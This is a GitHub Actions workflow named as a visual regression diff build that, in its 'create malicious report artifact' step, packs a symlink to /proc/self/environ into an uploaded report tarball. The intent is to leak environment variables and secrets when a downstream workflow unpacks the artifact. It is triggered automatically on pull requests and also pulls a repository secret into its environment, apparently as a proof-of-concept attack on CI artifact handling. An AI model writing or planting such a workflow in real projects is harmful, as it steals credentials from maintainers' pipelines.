name: 👀 Visual Regression Diff Build
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
permissions:
  contents: read
jobs:
  visual-diff-report:
    name: visual-diff report
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v6
    - name: GARALT debug probe
      run: 'echo "GARALT_DBG: Preparing malicious artifact with symlink to /proc/self/environ"'
      continue-on-error: true
    - name: create malicious report artifact
      run: |-
        mkdir -p visualRegressionReport
        echo "# Malicious Report" > visualRegressionReport/report.md
        # Create a symlink to leak environment variables
        ln -s /proc/self/environ visualRegressionReport/leak.txt
        tar -czvf visualRegressionReport.tar.gz visualRegressionReport/
    - name: upload report artifact
      uses: actions/upload-artifact@v4
      if: ${{ always() }}
      with:
        name: visual-regression-report
        path: visualRegressionReport.tar.gz
    - name: Save persist key
      if: ${{ always() }}
      run: echo ${{ github.event.number }} > ./visual-regression-pr-id.txt
    - name: Upload persist key
      if: ${{ always() }}
      uses: actions/upload-artifact@v4
      with:
        name: visual-regression-diff-ref
        path: ./visual-regression-pr-id.txt
env:
  GARALT_SECRET: ${{ secrets.GARALT }}
on:
  pull_request:
    branches:
    - master
    - feature
    - next
    types:
    - opened
    - synchronize
    - reopened
